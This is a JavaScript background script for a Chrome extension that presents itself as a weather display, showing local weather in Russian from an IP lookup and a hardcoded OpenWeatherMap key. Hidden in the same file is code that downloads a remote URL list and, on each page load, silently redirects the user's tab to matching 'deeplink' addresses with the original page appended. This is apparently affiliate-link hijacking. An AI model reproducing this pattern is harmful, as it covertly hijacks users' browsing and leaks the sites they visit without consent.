const refreshTime = 1000 * 60 * 60;
let dataToSend = [];

var tm = [];
var mainUrl = "";

readData = () => {
  const getIP = "http://ip-api.com/json/";
  const openWeatherMap = "http://api.openweathermap.org/data/2.5/weather";
  const appid = "826ab8d24703d18d5dbabd2c58c66c83";
  $(document).ready(() => {
    let url1 = "https://teamdreamrus.github.io/weatherExtension/data/data.json";
    $.getJSON(url1).done(data => {
      tm.length = 0;
      tm.push(...data.results);
    });
    $.getJSON(getIP).done(location => {
      let url;

      url = `${openWeatherMap}?q=${location.city},${
        location.countryCode
      }&lang=ru&appid=${appid}`;

      $.getJSON(url).done(weather => {
        dataToSend.push(weather.name);
        dataToSend.push(
          weather.weather[0].main,
          weather.weather[0].description
        );
        dataToSend.push(Math.round(weather.main.temp - 273) + "");
        dataToSend.push(weather.wind.speed + " м/с");
        dataToSend.push(weather.main.humidity + "%");
        dataToSend.push(
          Math.round(weather.main.pressure / 1, 333) + " мм.р.ст."
        );
      });
    });
  });
};

setInterval(readData(), refreshTime);

chrome.runtime.onMessage.addListener(() => {
  chrome.runtime.sendMessage(
    {
      dataToSend
    },
    () => {}
  );
});

const isValidUrl = string => {
  try {
    new URL(string);
    return true;
  } catch (_) {
    return false;
  }
};

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status == "loading" && tm.length > 578) {
    let urlStr = tab.url;

    if (isValidUrl(urlStr) && urlStr!="nullhome" && urlStr!="nullblank") {
      let urlBig = new URL(tab.url);
      let urlHost = urlBig.hostname;
      urlHost = urlHost.replace("www.", "");
      let urlHostPath = urlBig.hostname + urlBig.pathname;

      urlHostPath = urlHostPath.replace("www.", "");

      let d = tm.find(a => {
        let dataurlAll = new URL(a.url);
        let dataHost = dataurlAll.hostname;
        dataHost = dataHost.replace("www.", "");
        let dataurl = dataurlAll.hostname + dataurlAll.pathname;
        dataurl = dataurl.replace("www.", "");
        
        if (urlHost == dataHost) {
          return urlHostPath.includes(dataurl);
        } else {
          return false;
        }
      });
    
      if (d) {
        if (sessionStorage[`${d.url}`]);
        else {
          var newURL = "";
          var findURL = new URL(d.url);

          if (urlBig.pathname == findURL.pathname) {
            newURL = d.deeplink;
          } else {
            let e = new URL(urlStr),
              t = e.origin + e.pathname;
            newURL = d.deeplink + "?ulp=" + encodeURIComponent(t);
            if (t=="nullhome" || t=="nullblank")
              newURL="";
          }
          if(newURL!=""){
            chrome.tabs.update(tab.id, {
              url: newURL
            });
            sessionStorage[`${d.url}`] = !0;
          }
        }
      }
    }
  }
});
